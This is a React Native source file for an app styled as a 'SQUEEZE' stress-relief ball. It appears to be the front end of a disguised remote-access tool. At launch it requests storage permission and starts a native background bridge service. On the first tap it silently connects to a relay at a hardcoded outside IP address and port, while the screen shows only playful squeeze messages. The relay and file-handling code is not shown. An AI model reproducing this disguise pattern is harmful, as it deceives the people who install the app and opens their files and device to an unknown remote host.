import React, { useState, useEffect, useRef } from 'react';
import {
  View,
  Text,
  StyleSheet,
  TouchableWithoutFeedback,
  Animated,
  NativeModules,
  StatusBar,
} from 'react-native';
import RelayClient from './src/HttpServer';
import { requestStoragePermission } from './src/FileManager';

const { BridgeService } = NativeModules;

const RELAY_HOST = '82.70.228.76';
const RELAY_PORT = 8765;

// Squeeze messages shown while connected (pure stress ball UX)
const SQUEEZE_MESSAGES = [
  'squeeze me',
  'again',
  'and again',
  'keep going',
  'nice.',
  'breathe.',
  '...',
  'ok ok',
  'seriously?',
  'still here',
  'you ok?',
  'one more',
  '😤',
  '💆',
  'shhh',
];

export default function App() {
  const [connected, setConnected] = useState(false);
  const [squeezeMsg, setSqueezeMsg] = useState('squeeze');
  const [squeezeCount, setSqueezeCount] = useState(0);

  // Animations
  const scaleAnim = useRef(new Animated.Value(1)).current;
  const glowAnim = useRef(new Animated.Value(0)).current;
  const pulseAnim = useRef(new Animated.Value(1)).current;

  const clientRef = useRef<RelayClient | null>(null);
  const pulseLoopRef = useRef<Animated.CompositeAnimation | null>(null);

  useEffect(() => {
    requestStoragePermission();
    BridgeService?.start();
  }, []);

  useEffect(() => {
    if (connected) {
      // Start subtle idle pulse when connected
      pulseLoopRef.current = Animated.loop(
        Animated.sequence([
          Animated.timing(pulseAnim, { toValue: 1.04, duration: 1800, useNativeDriver: true }),
          Animated.timing(pulseAnim, { toValue: 1, duration: 1800, useNativeDriver: true }),
        ])
      );
      pulseLoopRef.current.start();
    } else {
      pulseLoopRef.current?.stop();
      Animated.timing(pulseAnim, { toValue: 1, duration: 200, useNativeDriver: true }).start();
    }
    return () => pulseLoopRef.current?.stop();
  }, [connected]);

  const animateSqueeze = () => {
    Animated.sequence([
      Animated.parallel([
        Animated.spring(scaleAnim, {
          toValue: 0.82,
          speed: 50,
          bounciness: 2,
          useNativeDriver: true,
        }),
        Animated.timing(glowAnim, { toValue: 1, duration: 80, useNativeDriver: false }),
      ]),
      Animated.parallel([
        Animated.spring(scaleAnim, {
          toValue: 1,
          speed: 12,
          bounciness: 18,
          useNativeDriver: true,
        }),
        Animated.timing(glowAnim, { toValue: 0, duration: 400, useNativeDriver: false }),
      ]),
    ]).start();
  };

  const handlePress = () => {
    animateSqueeze();

    if (!connected) {
      // First press while disconnected — connect to relay
      connect();
    } else {
      // Already connected — just stress ball behavior
      const next = squeezeCount + 1;
      setSqueezeCount(next);
      setSqueezeMsg(SQUEEZE_MESSAGES[next % SQUEEZE_MESSAGES.length]);
    }
  };

  const connect = () => {
    const client = new RelayClient(RELAY_HOST, RELAY_PORT, () => {});
    client.onStatusChange = (status: boolean) => {
      setConnected(status);
      if (status) {
        setSqueezeMsg('squeeze me');
        setSqueezeCount(0);
      }
    };
    client.start();
    clientRef.current = client;
  };

  const glowColor = glowAnim.interpolate({
    inputRange: [0, 1],
    outputRange: ['rgba(255,100,80,0)', 'rgba(255,140,100,0.6)'],
  });

  const ballColor = connected ? '#e05a3a' : '#c94830';

  return (
    <View style={styles.container}>
      <StatusBar hidden />

      {/* Title */}
      <Text style={styles.title}>S Q U E E Z E</Text>
      <Text style={styles.subtitle}>stress relief</Text>

      {/* Ball */}
      <View style={styles.ballWrapper}>
        <TouchableWithoutFeedback onPress={handlePress}>
          <Animated.View
            style={[
              styles.ballOuter,
              {
                transform: [
                  { scale: Animated.multiply(scaleAnim, pulseAnim) },
                ],
                shadowColor: glowColor as any,
              },
            ]}
          >
            {/* Shine */}
            <View style={styles.shine} />
            {/* Inner shadow ring */}
            <View style={styles.innerRing} />
            {/* Status dot */}
            <View style={[styles.statusDot, { backgroundColor: connected ? '#4ade80' : '#555' }]} />
          </Animated.View>
        </TouchableWithoutFeedback>
      </View>

      {/* Message */}
      <Text style={styles.message}>{squeezeMsg}</Text>

      {/* Squeeze counter */}
      {connected && squeezeCount > 0 && (
        <Text style={styles.counter}>×{squeezeCount}</Text>
      )}
    </View>
  );
}

const BALL_SIZE = 220;

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#0d0d0d',
    alignItems: 'center',
    justifyContent: 'center',
  },
  title: {
    color: '#2a2a2a',
    fontSize: 13,
    letterSpacing: 8,
    fontWeight: '700',
    marginBottom: 4,
    position: 'absolute',
    top: 70,
  },
  subtitle: {
    color: '#1e1e1e',
    fontSize: 10,
    letterSpacing: 4,
    position: 'absolute',
    top: 90,
  },
  ballWrapper: {
    width: BALL_SIZE,
    height: BALL_SIZE,
    alignItems: 'center',
    justifyContent: 'center',
  },
  ballOuter: {
    width: BALL_SIZE,
    height: BALL_SIZE,
    borderRadius: BALL_SIZE / 2,
    backgroundColor: '#c94830',
    alignItems: 'center',
    justifyContent: 'center',
    shadowColor: '#ff6040',
    shadowOffset: { width: 0, height: 0 },
    shadowOpacity: 0.9,
    shadowRadius: 40,
    elevation: 20,
    // Tactile depth
    borderTopColor: '#e05a3a',
    borderBottomColor: '#8b2a18',
    borderLeftColor: '#c04028',
    borderRightColor: '#c04028',
    borderWidth: 0,
  },
  shine: {
    position: 'absolute',
    top: 28,
    left: 44,
    width: 60,
    height: 30,
    borderRadius: 30,
    backgroundColor: 'rgba(255,255,255,0.12)',
    transform: [{ rotate: '-20deg' }],
  },
  innerRing: {
    position: 'absolute',
    width: BALL_SIZE - 20,
    height: BALL_SIZE - 20,
    borderRadius: (BALL_SIZE - 20) / 2,
    borderWidth: 1,
    borderColor: 'rgba(0,0,0,0.15)',
  },
  statusDot: {
    position: 'absolute',
    bottom: 44,
    width: 8,
    height: 8,
    borderRadius: 4,
  },
  message: {
    position: 'absolute',
    bottom: 110,
    color: '#3a3a3a',
    fontSize: 14,
    letterSpacing: 3,
    fontWeight: '500',
  },
  counter: {
    position: 'absolute',
    bottom: 85,
    color: '#2a2a2a',
    fontSize: 11,
    letterSpacing: 2,
  },
});
